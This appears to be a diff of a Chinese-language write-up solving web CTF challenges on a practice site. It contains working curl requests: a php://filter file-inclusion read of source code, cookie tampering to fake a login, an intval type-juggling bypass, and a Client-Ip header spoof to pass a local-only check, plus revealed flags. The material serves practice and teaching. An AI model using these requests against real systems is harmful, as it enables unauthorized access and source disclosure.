@@ -49,6 +49,20 @@ javascript里也存在类似的问题，区别在于如果两个都是字符串�
 
 需要修改输入框的maxlength。
 
+## [这题不是WEB](http://chinalover.sinaapp.com/web2/index.html)
+
+页面有个动图，保存下来之后用 `hexdump 2.gif -C`发现答案在尾部：
+
+```
+0000a330  b3 5b be c2 0a 16 b3 5f  5e c1 de 96 8e 19 08 00  |.[....._^.......|
+0000a340  3b 6e 63 74 66 7b 70 68  6f 74 6f 5f 63 61 6e 5f  |;nctf{photo_can_|
+0000a350  61 6c 73 6f 5f 68 69 64  33 5f 6d 73 67 7d 20 20  |also_hid3_msg}  |
+0000a360  20 20 20 20 20 20 20 20  20 20 20 20 20 20        |              |
+```
+### Notes
+- 原来图片可以藏信息，图片的展示也不会受到影响。
+
+
 ## [单身二十年](http://chinalover.sinaapp.com/web8/)
 
 ```shell
@@ -95,6 +109,19 @@ eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));
 貌似执行一下就可以了；解码之后的内容是`phpinfo();flag:nctf{...}`。暂时不清楚这段编码的作用。
 
 
+## [文件包含](http://4.chinalover.sinaapp.com/web7/index.php)
+
+包含当前页面，使用base64编码避免递归，然后可以再base64解码。
+
+```shell
+curl http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
+```
+
+### Notes
+
+- php [filter](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter)
+
+
 ## [Cookie](http://chinalover.sinaapp.com/web10/index.php)
 
 curl的结果中有个Set-Cookie: Login=0，server也许是通过这个Login的值判断有没有登录。这里的提示是cookie和session不一致。
@@ -102,10 +129,10 @@ curl的结果中有个Set-Cookie: Login=0，server也许是通过这个Login的�
 ```shell
 curl http://chinalover.sinaapp.com/web10/index.php -v -H 'Cookie: Login=1'
 ```
-<!-- 
+
 ## [MYSQL](http://chinalover.sinaapp.com/web11/)
 
-提示是robots.txt，所以
+提示是robots.txt，可以在robots.txt找到源代码
 
 ```shell
 curl http://chinalover.sinaapp.com/web11/robots.txt
@@ -128,11 +155,15 @@ if($_GET[id]) {
 }
 ?>
 ```
+虽然把`id`的值转换为整数类型，但是在比较逻辑里又使用了原来的参数，所以这里可以输入一个浮点数绕过
 
+```shell
+curl http://chinalover.sinaapp.com/web11/sql.php?id=1024.1
+```
 ### Notes
 
 - robots.txt
-- `intval` in php -->
+- `intval` in php
 
 ## [/x00](http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php)
 
@@ -199,6 +230,21 @@ curl 'http://chinalover.sinaapp.com/web18/' -X POST -d 'pass=kke&thepassword_123
 ### Notes
 
 - php `extract` imports variables into the current symbol table from an array
+
+## [伪装者](http://chinalover.sinaapp.com/web4/xxx.php)
+
+```html
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+<pre><br><br><br><br>* * * * * * * * * * * * * * * * * * * * * * * * * *<br><br>         管理系统只能在本地登陆<br><br>           本系统外部禁止访问<br><br>* * * * * * * * * * * * * * * * * * * * * * * * * *<br></pre>不是本地登陆你还想要flag？
+</html>
+```
+
+这里`X-Forwarded-For`不OK，要用`Client-Ip`:
+```shell
+curl http://chinalover.sinaapp.com/web4/xxx.php -v -H 'Client-Ip: 127.0.0.1'
+```
 
 ## [SQL注入1](http://chinalover.sinaapp.com/index.php)
 
